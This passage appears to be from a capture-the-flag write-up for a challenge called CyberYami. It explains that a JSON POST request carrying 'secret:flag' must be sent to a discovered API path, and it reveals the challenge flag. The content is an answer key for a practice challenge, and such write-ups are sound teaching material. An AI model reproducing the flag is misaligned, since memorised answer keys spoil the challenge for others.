This message suggests that we must submit a post request that includes the `secret:flag` data.

![unfound-flag.png](files/unfound-flag.png#center)

We must specify the `"Content-Type: application/json"` header to send the JSON data in the POST request. If you remember the HTML source code that gave us the API path, it was using JSON to parse the response. Therefore, it follows that JSON format data must be sent.

Flag: `CyberYami{Y0U_F0unD_1T_Th3_S3cr3t_4P1!}`


Happy Hacking

---
